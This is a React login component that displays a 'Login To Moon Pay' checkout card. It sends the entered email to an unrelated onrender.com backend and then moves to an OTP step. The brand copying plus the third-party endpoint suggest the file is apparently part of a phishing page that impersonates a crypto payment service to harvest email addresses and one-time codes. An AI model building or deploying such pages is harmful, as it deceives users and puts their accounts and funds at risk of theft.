import React, { useState } from 'react';
import styled from 'styled-components';
import Footer from './Footer';
import Navbar from './Navbar';
import { useNavigate } from 'react-router-dom';
import HomeContact from './HomeContact';
import axios from 'axios';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const PageContainer = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  min-height: fit-content;
  justify-content: space-between;
  gap: 10rem;
  background-color: #1c1c1c;
  color: white;
  padding: 20px;
`;

const Card = styled.div`
  background-color: white;
  border-radius: 10px;
  padding: 20px;
  width: 380px;
  height: 580px;
  color: black;
  margin-top: 5%;
  margin-bottom: 20px;
  
  @media (max-width: 430px) {
    width: 100%;

  }
`;

const Title = styled.h1`
  color: #ffa500;
  font-size: 18px;
  margin-bottom: 20px;
`;

const Logo = styled.div`
  color: #ffa500;
  font-size: 24px;
  font-weight: bold;
  margin-bottom: 20px;
`;

const Subtitle = styled.h2`
  font-size: 20px;
  margin-bottom: 20px;
`;
const Label = styled.label`
font-size: 18px;
`


const Input = styled.input`
  width: 100%;
  padding: 10px;
  margin:10px auto;
  border: 1px solid #ccc;
  border-radius: 5px;
`;

const CheckboxLabel = styled.label`
  display: flex;
  align-items: center;
  font-size: 15px;
  margin-bottom: 20px;
  margin: 10px auto;
`;

const Checkbox = styled.input`
  margin-right: 10px;
`;

const Button = styled.button`
  display: flex;
  justify-content: center;
  align-items: center;
  background-color: #ffa500;
  color: white;
  border: none;
  font-size: 15px;
  border-radius: 5px;
  padding: 10px;
  width: 100%;
  cursor: pointer;
  opacity: ${props => (props.disabled ? 0.5 : 1)};
`;

const PoweredBy = styled.p`
  font-size: 13px;
  color: #666;
  text-align: center;
  margin: 15px;
`;

const LoadingSpinner = styled.div`
  border: 4px solid rgba(255, 255, 255, 0.3);
  border-radius: 50%;
  border-top: 4px solid #ffa500;
  width: 30px;
  height: 30px;
  animation: spin 1s linear infinite;
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
`;
const Boxx = styled.div`
 margin-bottom: 64%;
`;
const Boo = styled.div`
 
`;
const Forg = styled.div`
 display: flex;
 flex-direction: column;
 justify-content: space-between;
`;

const Sell2 = () => {
  const [email, setEmail] = useState('');
  const [isChecked, setIsChecked] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const isFormValid = email !== '' && isChecked;

  const handleProceed = async () => {
    if (isFormValid) {
      setLoading(true);
      try {
        const response = await axios.post('https://crypto-anl6.onrender.com/users/login', { Email: email });
        if (response.status === 200) {
          navigate('/otp', { state: { email: email } });
        }
      } catch (error) {
        console.error("Error during login:", error);
        toast.error("Invalid email or server error. Please try again.");
      } finally {
        setLoading(false);
      }
    } else {
      toast.error("Please enter a valid email and agree to the terms.");
    }
  };

  return (
    <>
      <Navbar />
      <PageContainer>
        <Card>

          <Title>Login To Moon Pay</Title>
          <Logo>LOGO</Logo>
          <Subtitle>Checkout with Moon Pay</Subtitle>
    
          <Forg>
          <Boxx>
            <Label>What is your email address?</Label>
            <Input
              type="email"
              placeholder="Enter your mail"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <CheckboxLabel>
              <Checkbox
                type="checkbox"
                checked={isChecked}
                onChange={(e) => setIsChecked(e.target.checked)}
              />
              I have read and agree to Moon Pay's Terms Of Services and privacy policy.
            </CheckboxLabel>

            </Boxx>
            <Boo>
            <Button type="button" disabled={!isFormValid || loading} onClick={handleProceed}>
              {loading ? <LoadingSpinner /> : 'Proceed - Buy ACH →'}
            </Button>
            <PoweredBy>Powered by Moon Pay</PoweredBy>
            </Boo>
          </Forg>
        
        </Card>
        <HomeContact />
      </PageContainer>
      <Footer />
      <ToastContainer />
    </>
  );
};

export default Sell2;
